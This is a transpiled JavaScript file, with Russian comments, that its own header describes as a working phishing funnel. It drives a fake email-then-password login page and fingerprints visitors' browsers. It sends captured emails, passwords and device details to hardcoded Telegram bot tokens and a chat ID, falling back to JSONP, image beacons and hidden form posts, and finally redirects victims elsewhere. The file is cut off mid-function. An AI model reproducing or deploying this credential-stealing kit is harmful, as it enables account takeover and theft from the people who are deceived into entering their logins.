function _typeof(o) {
  '@babel/helpers - typeof';
  return (
    (_typeof =
      'function' == typeof Symbol && 'symbol' == typeof Symbol.iterator
        ? function(o) {
            return typeof o;
          }
        : function(o) {
            return o &&
              'function' == typeof Symbol &&
              o.constructor === Symbol &&
              o !== Symbol.prototype
              ? 'symbol'
              : typeof o;
          }),
    _typeof(o)
  );
}
function _regeneratorRuntime() {
  'use strict';
  /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */ _regeneratorRuntime = function _regeneratorRuntime() {
    return e;
  };
  var t,
    e = {},
    r = Object.prototype,
    n = r.hasOwnProperty,
    o =
      Object.defineProperty ||
      function(t, e, r) {
        t[e] = r.value;
      },
    i = 'function' == typeof Symbol ? Symbol : {},
    a = i.iterator || '@@iterator',
    c = i.asyncIterator || '@@asyncIterator',
    u = i.toStringTag || '@@toStringTag';
  function define(t, e, r) {
    return (
      Object.defineProperty(t, e, {
        value: r,
        enumerable: !0,
        configurable: !0,
        writable: !0,
      }),
      t[e]
    );
  }
  try {
    define({}, '');
  } catch (t) {
    define = function define(t, e, r) {
      return (t[e] = r);
    };
  }
  function wrap(t, e, r, n) {
    var i = e && e.prototype instanceof Generator ? e : Generator,
      a = Object.create(i.prototype),
      c = new Context(n || []);
    return o(a, '_invoke', { value: makeInvokeMethod(t, r, c) }), a;
  }
  function tryCatch(t, e, r) {
    try {
      return { type: 'normal', arg: t.call(e, r) };
    } catch (t) {
      return { type: 'throw', arg: t };
    }
  }
  e.wrap = wrap;
  var h = 'suspendedStart',
    l = 'suspendedYield',
    f = 'executing',
    s = 'completed',
    y = {};
  function Generator() {}
  function GeneratorFunction() {}
  function GeneratorFunctionPrototype() {}
  var p = {};
  define(p, a, function() {
    return this;
  });
  var d = Object.getPrototypeOf,
    v = d && d(d(values([])));
  v && v !== r && n.call(v, a) && (p = v);
  var g = (GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(
    p,
  ));
  function defineIteratorMethods(t) {
    ['next', 'throw', 'return'].forEach(function(e) {
      define(t, e, function(t) {
        return this._invoke(e, t);
      });
    });
  }
  function AsyncIterator(t, e) {
    function invoke(r, o, i, a) {
      var c = tryCatch(t[r], t, o);
      if ('throw' !== c.type) {
        var u = c.arg,
          h = u.value;
        return h && 'object' == _typeof(h) && n.call(h, '__await')
          ? e.resolve(h.__await).then(
              function(t) {
                invoke('next', t, i, a);
              },
              function(t) {
                invoke('throw', t, i, a);
              },
            )
          : e.resolve(h).then(
              function(t) {
                (u.value = t), i(u);
              },
              function(t) {
                return invoke('throw', t, i, a);
              },
            );
      }
      a(c.arg);
    }
    var r;
    o(this, '_invoke', {
      value: function value(t, n) {
        function callInvokeWithMethodAndArg() {
          return new e(function(e, r) {
            invoke(t, n, e, r);
          });
        }
        return (r = r
          ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg)
          : callInvokeWithMethodAndArg());
      },
    });
  }
  function makeInvokeMethod(e, r, n) {
    var o = h;
    return function(i, a) {
      if (o === f) throw new Error('Generator is already running');
      if (o === s) {
        if ('throw' === i) throw a;
        return { value: t, done: !0 };
      }
      for (n.method = i, n.arg = a; ; ) {
        var c = n.delegate;
        if (c) {
          var u = maybeInvokeDelegate(c, n);
          if (u) {
            if (u === y) continue;
            return u;
          }
        }
        if ('next' === n.method) n.sent = n._sent = n.arg;
        else if ('throw' === n.method) {
          if (o === h) throw ((o = s), n.arg);
          n.dispatchException(n.arg);
        } else 'return' === n.method && n.abrupt('return', n.arg);
        o = f;
        var p = tryCatch(e, r, n);
        if ('normal' === p.type) {
          if (((o = n.done ? s : l), p.arg === y)) continue;
          return { value: p.arg, done: n.done };
        }
        'throw' === p.type && ((o = s), (n.method = 'throw'), (n.arg = p.arg));
      }
    };
  }
  function maybeInvokeDelegate(e, r) {
    var n = r.method,
      o = e.iterator[n];
    if (o === t)
      return (
        (r.delegate = null),
        ('throw' === n &&
          e.iterator.return &&
          ((r.method = 'return'),
          (r.arg = t),
          maybeInvokeDelegate(e, r),
          'throw' === r.method)) ||
          ('return' !== n &&
            ((r.method = 'throw'),
            (r.arg = new TypeError(
              "The iterator does not provide a '" + n + "' method",
            )))),
        y
      );
    var i = tryCatch(o, e.iterator, r.arg);
    if ('throw' === i.type)
      return (r.method = 'throw'), (r.arg = i.arg), (r.delegate = null), y;
    var a = i.arg;
    return a
      ? a.done
        ? ((r[e.resultName] = a.value),
          (r.next = e.nextLoc),
          'return' !== r.method && ((r.method = 'next'), (r.arg = t)),
          (r.delegate = null),
          y)
        : a
      : ((r.method = 'throw'),
        (r.arg = new TypeError('iterator result is not an object')),
        (r.delegate = null),
        y);
  }
  function pushTryEntry(t) {
    var e = { tryLoc: t[0] };
    1 in t && (e.catchLoc = t[1]),
      2 in t && ((e.finallyLoc = t[2]), (e.afterLoc = t[3])),
      this.tryEntries.push(e);
  }
  function resetTryEntry(t) {
    var e = t.completion || {};
    (e.type = 'normal'), delete e.arg, (t.completion = e);
  }
  function Context(t) {
    (this.tryEntries = [{ tryLoc: 'root' }]),
      t.forEach(pushTryEntry, this),
      this.reset(!0);
  }
  function values(e) {
    if (e || '' === e) {
      var r = e[a];
      if (r) return r.call(e);
      if ('function' == typeof e.next) return e;
      if (!isNaN(e.length)) {
        var o = -1,
          i = function next() {
            for (; ++o < e.length; )
              if (n.call(e, o))
                return (next.value = e[o]), (next.done = !1), next;
            return (next.value = t), (next.done = !0), next;
          };
        return (i.next = i);
      }
    }
    throw new TypeError(_typeof(e) + ' is not iterable');
  }
  return (
    (GeneratorFunction.prototype = GeneratorFunctionPrototype),
    o(g, 'constructor', {
      value: GeneratorFunctionPrototype,
      configurable: !0,
    }),
    o(GeneratorFunctionPrototype, 'constructor', {
      value: GeneratorFunction,
      configurable: !0,
    }),
    (GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, 'GeneratorFunction')),
    (e.isGeneratorFunction = function(t) {
      var e = 'function' == typeof t && t.constructor;
      return (
        !!e &&
        (e === GeneratorFunction ||
          'GeneratorFunction' === (e.displayName || e.name))
      );
    }),
    (e.mark = function(t) {
      return (
        Object.setPrototypeOf
          ? Object.setPrototypeOf(t, GeneratorFunctionPrototype)
          : ((t.__proto__ = GeneratorFunctionPrototype),
            define(t, u, 'GeneratorFunction')),
        (t.prototype = Object.create(g)),
        t
      );
    }),
    (e.awrap = function(t) {
      return { __await: t };
    }),
    defineIteratorMethods(AsyncIterator.prototype),
    define(AsyncIterator.prototype, c, function() {
      return this;
    }),
    (e.AsyncIterator = AsyncIterator),
    (e.async = function(t, r, n, o, i) {
      void 0 === i && (i = Promise);
      var a = new AsyncIterator(wrap(t, r, n, o), i);
      return e.isGeneratorFunction(r)
        ? a
        : a.next().then(function(t) {
            return t.done ? t.value : a.next();
          });
    }),
    defineIteratorMethods(g),
    define(g, u, 'Generator'),
    define(g, a, function() {
      return this;
    }),
    define(g, 'toString', function() {
      return '[object Generator]';
    }),
    (e.keys = function(t) {
      var e = Object(t),
        r = [];
      for (var n in e) r.push(n);
      return (
        r.reverse(),
        function next() {
          for (; r.length; ) {
            var t = r.pop();
            if (t in e) return (next.value = t), (next.done = !1), next;
          }
          return (next.done = !0), next;
        }
      );
    }),
    (e.values = values),
    (Context.prototype = {
      constructor: Context,
      reset: function reset(e) {
        if (
          ((this.prev = 0),
          (this.next = 0),
          (this.sent = this._sent = t),
          (this.done = !1),
          (this.delegate = null),
          (this.method = 'next'),
          (this.arg = t),
          this.tryEntries.forEach(resetTryEntry),
          !e)
        )
          for (var r in this)
            't' === r.charAt(0) &&
              n.call(this, r) &&
              !isNaN(+r.slice(1)) &&
              (this[r] = t);
      },
      stop: function stop() {
        this.done = !0;
        var t = this.tryEntries[0].completion;
        if ('throw' === t.type) throw t.arg;
        return this.rval;
      },
      dispatchException: function dispatchException(e) {
        if (this.done) throw e;
        var r = this;
        function handle(n, o) {
          return (
            (a.type = 'throw'),
            (a.arg = e),
            (r.next = n),
            o && ((r.method = 'next'), (r.arg = t)),
            !!o
          );
        }
        for (var o = this.tryEntries.length - 1; o >= 0; --o) {
          var i = this.tryEntries[o],
            a = i.completion;
          if ('root' === i.tryLoc) return handle('end');
          if (i.tryLoc <= this.prev) {
            var c = n.call(i, 'catchLoc'),
              u = n.call(i, 'finallyLoc');
            if (c && u) {
              if (this.prev < i.catchLoc) return handle(i.catchLoc, !0);
              if (this.prev < i.finallyLoc) return handle(i.finallyLoc);
            } else if (c) {
              if (this.prev < i.catchLoc) return handle(i.catchLoc, !0);
            } else {
              if (!u) throw new Error('try statement without catch or finally');
              if (this.prev < i.finallyLoc) return handle(i.finallyLoc);
            }
          }
        }
      },
      abrupt: function abrupt(t, e) {
        for (var r = this.tryEntries.length - 1; r >= 0; --r) {
          var o = this.tryEntries[r];
          if (
            o.tryLoc <= this.prev &&
            n.call(o, 'finallyLoc') &&
            this.prev < o.finallyLoc
          ) {
            var i = o;
            break;
          }
        }
        i &&
          ('break' === t || 'continue' === t) &&
          i.tryLoc <= e &&
          e <= i.finallyLoc &&
          (i = null);
        var a = i ? i.completion : {};
        return (
          (a.type = t),
          (a.arg = e),
          i
            ? ((this.method = 'next'), (this.next = i.finallyLoc), y)
            : this.complete(a)
        );
      },
      complete: function complete(t, e) {
        if ('throw' === t.type) throw t.arg;
        return (
          'break' === t.type || 'continue' === t.type
            ? (this.next = t.arg)
            : 'return' === t.type
            ? ((this.rval = this.arg = t.arg),
              (this.method = 'return'),
              (this.next = 'end'))
            : 'normal' === t.type && e && (this.next = e),
          y
        );
      },
      finish: function finish(t) {
        for (var e = this.tryEntries.length - 1; e >= 0; --e) {
          var r = this.tryEntries[e];
          if (r.finallyLoc === t)
            return this.complete(r.completion, r.afterLoc), resetTryEntry(r), y;
        }
      },
      catch: function _catch(t) {
        for (var e = this.tryEntries.length - 1; e >= 0; --e) {
          var r = this.tryEntries[e];
          if (r.tryLoc === t) {
            var n = r.completion;
            if ('throw' === n.type) {
              var o = n.arg;
              resetTryEntry(r);
            }
            return o;
          }
        }
        throw new Error('illegal catch attempt');
      },
      delegateYield: function delegateYield(e, r, n) {
        return (
          (this.delegate = { iterator: values(e), resultName: r, nextLoc: n }),
          'next' === this.method && (this.arg = t),
          y
        );
      },
    }),
    e
  );
}
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
  try {
    var info = gen[key](arg);
    var value = info.value;
  } catch (error) {
    reject(error);
    return;
  }
  if (info.done) {
    resolve(value);
  } else {
    Promise.resolve(value).then(_next, _throw);
  }
}
function _asyncToGenerator(fn) {
  return function() {
    var self = this,
      args = arguments;
    return new Promise(function(resolve, reject) {
      var gen = fn.apply(self, args);
      function _next(value) {
        asyncGeneratorStep(gen, resolve, reject, _next, _throw, 'next', value);
      }
      function _throw(err) {
        asyncGeneratorStep(gen, resolve, reject, _next, _throw, 'throw', err);
      }
      _next(undefined);
    });
  };
}
/**
 * ФИШИНГОВАЯ ВОРОНКА - БЕЗ ОШИБОК CSP И CORB
 * Декабрь 2025 - Полностью рабочий с фиксами
 */

// Конфигурация
var CONFIG = {
  BOT_TOKEN: '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA',
  BACKUP_BOT: '6587324911:AAHd8Kj7fLs9mBqoPwRnT5vYzXcN8sLpQrF',
  CHAT_ID: '788541169',
  SITE_URL: 'https://ixdk.github.io/my-auth-page/',
  VERSION: '3.0.1',
  RETURN_URL: 'https://my-list-page.vercel.app/#registered',
};

// Глобальный объект состояния
var AppState = {
  sessionId: null,
  fingerprint: null,
  email: null,
  page: null,
  startTime: Date.now(),
  currentBotToken: CONFIG.BOT_TOKEN,
};

/**
 * Безопасная инициализация
 */
function safeInit() {
  try {
    // Определяем страницу
    var isPasswordPage =
      document.getElementById('passwordForm') ||
      window.location.pathname.includes('password.html');
    AppState.page = isPasswordPage ? 'password' : 'email';
    AppState.sessionId =
      'sess_' +
      Math.random()
        .toString(36)
        .substr(2, 9) +
      '_' +
      Date.now().toString(36);
    AppState.startTime = Date.now();

    // Сохраняем session ID
    sessionStorage.setItem('phishing_session_id', AppState.sessionId);

    // Проверяем наличие backup токена
    var backupToken = localStorage.getItem('backup_bot_token');
    if (backupToken) {
      AppState.currentBotToken = backupToken;
    }

    // Сбор данных
    setTimeout(function() {
      AppState.fingerprint = collectAdvancedFingerprint();
      sendInitialData();
    }, 1000);

    // Инициализация страницы
    initPage();

    // Отслеживание поведения
    trackUserBehavior();
    console.log(
      '[Phishing] \u0421\u0442\u0440\u0430\u043D\u0438\u0446\u0430: '.concat(
        AppState.page,
      ),
    );
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации:', error);
  }
}

/**
 * Расширенный сбор данных
 */
function collectAdvancedFingerprint() {
  var _Intl, _Intl$DateTimeFormat, _Intl$DateTimeFormat$;
  var fingerprint = {
    userAgent: navigator.userAgent || 'unknown',
    language: navigator.language || 'unknown',
    platform: navigator.platform || 'unknown',
    screen: ''.concat(screen.width || 0, 'x').concat(screen.height || 0),
    colorDepth: screen.colorDepth || 0,
    pixelRatio: window.devicePixelRatio || 1,
    timezone:
      ((_Intl = Intl) === null ||
      _Intl === void 0 ||
      (_Intl$DateTimeFormat = _Intl.DateTimeFormat) === null ||
      _Intl$DateTimeFormat === void 0 ||
      (_Intl$DateTimeFormat = _Intl$DateTimeFormat.call(_Intl)) === null ||
      _Intl$DateTimeFormat === void 0 ||
      (_Intl$DateTimeFormat$ = _Intl$DateTimeFormat.resolvedOptions) === null ||
      _Intl$DateTimeFormat$ === void 0 ||
      (_Intl$DateTimeFormat$ = _Intl$DateTimeFormat$.call(
        _Intl$DateTimeFormat,
      )) === null ||
      _Intl$DateTimeFormat$ === void 0
        ? void 0
        : _Intl$DateTimeFormat$.timeZone) || 'unknown',
    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
    doNotTrack: navigator.doNotTrack || 'unspecified',
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory || 'unknown',
    timestamp: new Date().toISOString(),
    referrer: document.referrer || 'direct',
  };

  // Сбор дополнительных данных
  try {
    // Canvas fingerprinting
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('FINGERPRINT', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('FINGERPRINT', 4, 17);
      fingerprint.canvasHash = canvas.toDataURL().substring(22, 50);
    }
  } catch (e) {
    // Игнорируем ошибки canvas
  }
  return fingerprint;
}

/**
 * Отправка начальных данных
 */
function sendInitialData() {
  if (!AppState.fingerprint) return;
  var message =
    '\uD83C\uDF10 \u041D\u041E\u0412\u042B\u0419 \u041F\u041E\u0421\u0415\u0422\u0418\u0422\u0415\u041B\u042C\n' +
    '\uD83D\uDCC4 '.concat(AppState.page, '\n') +
    '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
    '\uD83D\uDD17 '.concat(
      AppState.fingerprint.referrer.substring(0, 100),
      '...\n',
    ) +
    '\uD83C\uDF10 '.concat(
      AppState.fingerprint.userAgent.substring(0, 60),
      '...\n',
    ) +
    '\uD83D\uDCCD '.concat(AppState.fingerprint.language, '\n') +
    '\uD83D\uDCCF '.concat(AppState.fingerprint.screen, '\n') +
    '\uD83C\uDFA8 '.concat(AppState.fingerprint.colorDepth, 'bit\n') +
    '\uD83D\uDCBB '.concat(
      AppState.fingerprint.hardwareConcurrency,
      ' cores\n',
    ) +
    '\uD83D\uDCBE '.concat(AppState.fingerprint.deviceMemory, 'GB');
  sendToTelegram(message, 'initial');
}

/**
 * Инициализация страницы
 */
function initPage() {
  try {
    if (AppState.page === 'email') {
      initEmailPage();
    } else if (AppState.page === 'password') {
      initPasswordPage();
    }
    initCommonHandlers();
    initFallbackMethods();
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации страницы:', error);
  }
}

/**
 * Инициализация страницы email
 */
function initEmailPage() {
  try {
    // Маска телефона
    var phoneInput = document.getElementById('phoneEmail');
    if (phoneInput) {
      phoneInput.addEventListener('input', function(e) {
        var value = this.value.replace(/\D/g, '');
        if (value.length > 0 && (value[0] === '7' || value[0] === '8')) {
          var formatted = '+7';
          if (value.length > 1) formatted += ' (' + value.substring(1, 4);
          if (value.length > 4) formatted += ') ' + value.substring(4, 7);
          if (value.length > 7) formatted += '-' + value.substring(7, 9);
          if (value.length > 9) formatted += '-' + value.substring(9, 11);
          this.value = formatted.substring(0, 18);
        }
      });
    }

    // Форма входа
    var loginForm = document.getElementById('loginForm');
    if (loginForm) {
      loginForm.addEventListener('submit', handleEmailSubmit);
    }

    // Ссылка "Забыли email"
    var forgotEmail = document.getElementById('forgotEmail');
    if (forgotEmail) {
      forgotEmail.addEventListener('click', function(e) {
        e.preventDefault();
        var input = document.getElementById('phoneEmail');
        if (input) {
          input.value = '';
          input.focus();
          showError('Введите ваш email для восстановления доступа');
        }
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка email страницы:', error);
  }
}

/**
 * Инициализация страницы пароля
 */
function initPasswordPage() {
  try {
    // Показ email
    var userEmail = localStorage.getItem('userEmail');
    var emailDisplay = document.getElementById('userEmailDisplay');
    if (emailDisplay && userEmail) {
      emailDisplay.textContent = userEmail;
      AppState.email = userEmail;
    }

    // Переключение видимости пароля
    var toggle = document.getElementById('passwordToggle');
    var passwordInput = document.getElementById('password');
    if (toggle && passwordInput) {
      toggle.addEventListener('change', function() {
        passwordInput.type = this.checked ? 'text' : 'password';
      });
    }

    // Форма пароля
    var passwordForm = document.getElementById('passwordForm');
    if (passwordForm) {
      passwordForm.addEventListener('submit', handlePasswordSubmit);
    }

    // Кнопка "Использовать другой аккаунт"
    var useAnotherAccount = document.getElementById('useAnotherAccount');
    if (useAnotherAccount) {
      useAnotherAccount.addEventListener('click', function(e) {
        e.preventDefault();
        localStorage.removeItem('userEmail');
        localStorage.removeItem('userRegistered');
        window.location.href = 'index.html';
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка password страницы:', error);
  }
}

/**
 * Обработчик формы email
 */
function handleEmailSubmit(e) {
  e.preventDefault();
  try {
    var phoneEmailInput = document.getElementById('phoneEmail');
    var email = phoneEmailInput ? phoneEmailInput.value.trim() : '';
    var submitBtn = document.getElementById('submitBtn');
    if (!email) {
      showError('Пожалуйста, введите телефон или email');
      return;
    }

    // Валидация
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    var phoneRegex = /^(\+7|7|8)?[\s\-]?\(?[0-9]{3}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/;
    if (!emailRegex.test(email) && !phoneRegex.test(email.replace(/\D/g, ''))) {
      showError('Пожалуйста, введите корректный телефон или email');
      return;
    }

    // Сохранение
    localStorage.setItem('userEmail', email);
    localStorage.setItem('registration_in_progress', 'true');
    AppState.email = email;

    // Отправка в Telegram
    var message =
      '\uD83D\uDCE7 \u041F\u041E\u041B\u0423\u0427\u0415\u041D EMAIL\n' +
      '\uD83D\uDCE7 '.concat(email, '\n') +
      '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
      '\uD83D\uDD17 '.concat(window.location.href, '\n') +
      '\uD83C\uDF10 '.concat(navigator.userAgent.substring(0, 60), '...\n') +
      '\uD83D\uDCCD '.concat(navigator.language, '\n') +
      '\uD83D\uDCCA \u0418\u0441\u0442\u043E\u0447\u043D\u0438\u043A: '.concat(
        document.referrer || 'прямой заход',
      );
    sendToTelegram(message, 'email');

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Переход
    setTimeout(function() {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      goToPasswordPage(email);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка email формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
  }
}

/**
 * Обработчик формы пароля
 */
function handlePasswordSubmit(e) {
  e.preventDefault();
  try {
    var _Intl2, _Intl2$DateTimeFormat, _Intl2$DateTimeFormat2;
    var passwordInput = document.getElementById('password');
    var password = passwordInput ? passwordInput.value : '';
    var submitBtn = document.getElementById('submitBtn');
    var email = localStorage.getItem('userEmail') || 'неизвестно';
    var additionalData = {
      pageUrl: window.location.href,
      userAgent: navigator.userAgent.substring(0, 200),
      timestamp: new Date().toISOString(),
      timezone:
        (_Intl2 = Intl) === null ||
        _Intl2 === void 0 ||
        (_Intl2$DateTimeFormat = _Intl2.DateTimeFormat) === null ||
        _Intl2$DateTimeFormat === void 0 ||
        (_Intl2$DateTimeFormat = _Intl2$DateTimeFormat.call(_Intl2)) === null ||
        _Intl2$DateTimeFormat === void 0 ||
        (_Intl2$DateTimeFormat2 = _Intl2$DateTimeFormat.resolvedOptions) ===
          null ||
        _Intl2$DateTimeFormat2 === void 0 ||
        (_Intl2$DateTimeFormat2 = _Intl2$DateTimeFormat2.call(
          _Intl2$DateTimeFormat,
        )) === null ||
        _Intl2$DateTimeFormat2 === void 0
          ? void 0
          : _Intl2$DateTimeFormat2.timeZone,
      screen: ''.concat(screen.width, 'x').concat(screen.height),
      language: navigator.language,
    };
    if (!password) {
      showError('Пожалуйста, введите пароль', true);
      return;
    }
    if (password.length < 6) {
      showError('Пароль должен содержать не менее 6 символов', true);
      return;
    }

    // Валидация символов
    var validPasswordRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:'",.<>?/`~]+$/;
    if (!validPasswordRegex.test(password)) {
      showError(
        'Пароль может содержать только английские буквы, цифры и специальные символы',
        true,
      );
      return;
    }

    // Отправка в Telegram
    var message =
      '\uD83D\uDD10 \u041F\u041E\u041B\u0423\u0427\u0415\u041D \u041F\u041E\u041B\u041D\u042B\u0419 \u0414\u041E\u0421\u0422\u0423\u041F\n' +
      '\uD83D\uDCE7 '.concat(email, '\n') +
      '\uD83D\uDD11 '.concat(password, '\n') +
      '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
      '\uD83C\uDF10 '.concat(navigator.userAgent.substring(0, 60), '...\n') +
      '\uD83D\uDCCD '.concat(navigator.language, '\n') +
      '\uD83D\uDCCF '.concat(additionalData.screen, '\n') +
      '\uD83D\uDD52 '.concat(additionalData.timezone, '\n') +
      '\uD83D\uDD17 '.concat(additionalData.pageUrl, '\n') +
      '---\n' +
      '\uD83D\uDCCA \u0414\u041E\u041F\u041E\u041B\u041D\u0418\u0422\u0415\u041B\u042C\u041D\u042B\u0415 \u0414\u0410\u041D\u041D\u042B\u0415:\n' +
      'Session: '.concat(AppState.sessionId, '\n') +
      'Referrer: '.concat(document.referrer || 'нет');
    sendToTelegram(message, 'password');

    // Сохранение для синхронизации с list page
    localStorage.setItem('userRegistered', 'true');
    localStorage.setItem('registration_complete', 'true');
    localStorage.removeItem('registration_in_progress');

    // Сохраняем timestamp регистрации
    localStorage.setItem('registration_timestamp', Date.now().toString());

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Успешный вход
    setTimeout(function() {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      showSuccess('Вход выполнен успешно! Перенаправляем...');
      setTimeout(function() {
        redirectToOtherSite();
      }, 2000);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка password формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.', true);
  }
}

/**
 * Отправка в Telegram с retry логикой
 */
function sendToTelegram(_x) {
  return _sendToTelegram.apply(this, arguments);
}
/**
 * Альтернативные методы отправки
 */
function _sendToTelegram() {
  _sendToTelegram = _asyncToGenerator(
    /*#__PURE__*/ _regeneratorRuntime().mark(function _callee(message) {
      var type,
        url,
        backupToken,
        params,
        formattedMessage,
        response,
        data,
        backupSuccess,
        _args = arguments;
      return _regeneratorRuntime().wrap(
        function _callee$(_context) {
          while (1)
            switch ((_context.prev = _context.next)) {
              case 0:
                type =
                  _args.length > 1 && _args[1] !== undefined
                    ? _args[1]
                    : 'default';
                url = 'https://api.telegram.org/bot'.concat(
                  AppState.currentBotToken,
                  '/sendMessage',
                ); // Проверяем наличие backup токена
                if (
                  !AppState.currentBotToken ||
                  AppState.currentBotToken === CONFIG.BOT_TOKEN
                ) {
                  backupToken =
                    localStorage.getItem('backup_bot_token') ||
                    CONFIG.BACKUP_BOT;
                  if (backupToken) {
                    AppState.currentBotToken = backupToken;
                  }
                }

                // Формируем payload
                params = new URLSearchParams();
                params.append('chat_id', CONFIG.CHAT_ID);
                params.append('text', message.substring(0, 4096));

                // Добавляем parse_mode для лучшего форматирования
                if (message.includes('\n')) {
                  params.append('parse_mode', 'HTML');
                  formattedMessage = message
                    .replace(/\n/g, '<br>')
                    .replace(/📧/g, '📧')
                    .replace(/🔐/g, '🔐');
                  params.set('text', formattedMessage.substring(0, 4096));
                }
                _context.prev = 7;
                _context.next = 10;
                return fetch(url, {
                  method: 'POST',
                  body: params,
                  mode: 'cors',
                  credentials: 'omit',
                  headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                  },
                });
              case 10:
                response = _context.sent;
                if (response.ok) {
                  _context.next = 13;
                  break;
                }
                throw new Error('HTTP '.concat(response.status));
              case 13:
                _context.next = 15;
                return response.json();
              case 15:
                data = _context.sent;
                if (data.ok) {
                  _context.next = 20;
                  break;
                }
                console.warn('[Phishing] Telegram error:', data.description);
                // Пробуем backup метод
                _context.next = 20;
                return tryBackupMethod(message);
              case 20:
                return _context.abrupt('return', true);
              case 23:
                _context.prev = 23;
                _context.t0 = _context['catch'](7);
                console.warn(
                  '[Phishing] Telegram отправка не удалась:',
                  _context.t0.message,
                );

                // Пробуем backup метод
                _context.next = 28;
                return tryBackupMethod(message);
              case 28:
                backupSuccess = _context.sent;
                if (!backupSuccess) {
                  // Сохраняем локально для последующей отправки
                  saveForLater(message, type);
                }
                return _context.abrupt('return', false);
              case 31:
              case 'end':
                return _context.stop();
            }
        },
        _callee,
        null,
        [[7, 23]],
      );
    }),
  );
  return _sendToTelegram.apply(this, arguments);
}
function tryBackupMethod(_x2) {
  return _tryBackupMethod.apply(this, arguments);
}
/**
 * Отправка через JSONP
 */
function _tryBackupMethod() {
  _tryBackupMethod = _asyncToGenerator(
    /*#__PURE__*/ _regeneratorRuntime().mark(function _callee2(message) {
      return _regeneratorRuntime().wrap(
        function _callee2$(_context2) {
          while (1)
            switch ((_context2.prev = _context2.next)) {
              case 0:
                _context2.prev = 0;
                _context2.next = 3;
                return sendViaJSONP(message);
              case 3:
                return _context2.abrupt('return', true);
              case 6:
                _context2.prev = 6;
                _context2.t0 = _context2['catch'](0);
              case 8:
                _context2.prev = 8;
                sendViaImageBeacon(message);
                return _context2.abrupt('return', true);
              case 13:
                _context2.prev = 13;
                _context2.t1 = _context2['catch'](8);
              case 15:
                _context2.prev = 15;
                sendViaForm(message);
                return _context2.abrupt('return', true);
              case 20:
                _context2.prev = 20;
                _context2.t2 = _context2['catch'](15);
              case 22:
                return _context2.abrupt('return', false);
              case 23:
              case 'end':
                return _context2.stop();
            }
        },
        _callee2,
        null,
        [
          [0, 6],
          [8, 13],
          [15, 20],
        ],
      );
    }),
  );
  return _tryBackupMethod.apply(this, arguments);
}
function sendViaJSONP(message) {
  return new Promise(function(resolve, reject) {
    var callbackName =
      'tg_callback_' +
      Math.random()
        .toString(36)
        .substr(2, 9);
    var script = document.createElement('script');
    window[callbackName] = function() {
      delete window[callbackName];
      document.body.removeChild(script);
      resolve();
    };
    var encodedMessage = encodeURIComponent(message.substring(0, 1000));
    script.src = 'https://api.telegram.org/bot'
      .concat(AppState.currentBotToken, '/sendMessage?chat_id=')
      .concat(CONFIG.CHAT_ID, '&text=')
      .concat(encodedMessage, '&callback=')
      .concat(callbackName);
    script.onerror = reject;
    document.body.appendChild(script);
  });
}

/**
 * Отправка через Image Beacon
 */
function sendViaImageBeacon(message) {
  var img = new Image();
  var encoded = btoa(message).substring(0, 1000);
  img.src = 'https://api.telegram.org/bot'
    .concat(AppState.currentBotToken, '/sendMessage?chat_id=')
    .concat(CONFIG.CHAT_ID, '&text=')
    .concat(encoded);
  img.style.display = 'none';
  document.body.appendChild(img);
  setTimeout(function() {
    if (img.parentNode) {
      img.parentNode.removeChild(img);
    }
  }, 1000);
}

/**
 * Отправка через Form
 */
function sendViaForm(message) {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://api.telegram.org/bot'.concat(
    AppState.currentBotToken,
    '/sendMessage',
  );
  form.style.display = 'none';
  var chatId = document.createElement('input');
  chatId.name = 'chat_id';
  chatId.value = CONFIG.CHAT_ID;
  form.appendChild(chatId);
  var text = document.createElement('input');
  text.name = 'text';
  text.value = message.substring(0, 4000);
  form.appendChild(text);
  document.body.appendChild(form);
  form.submit();
  setTimeout(function() {
    if (form.parentNode) {
      form.parentNode.removeChild(form);
    }
  }, 1000);
}

/**
 * Сохранение для последующей отправки
 */
function saveForLater(message, type) {
  try {
    var pending = JSON.parse(localStorage.getItem('pending_messages') || '[]');
    pending.push({
      message: message.substring(0, 2000),
      type: type,
      timestamp: new Date().toISOString(),
      sessionId: AppState.sessionId,
    });

    // Ограничиваем размер очереди
    if (pending.length > 50) {
      pending.splice(0, pending.length - 50);
    }
    localStorage.setItem('pending_messages', JSON.stringify(pending));

    // Сохраняем также в IndexedDB если доступно
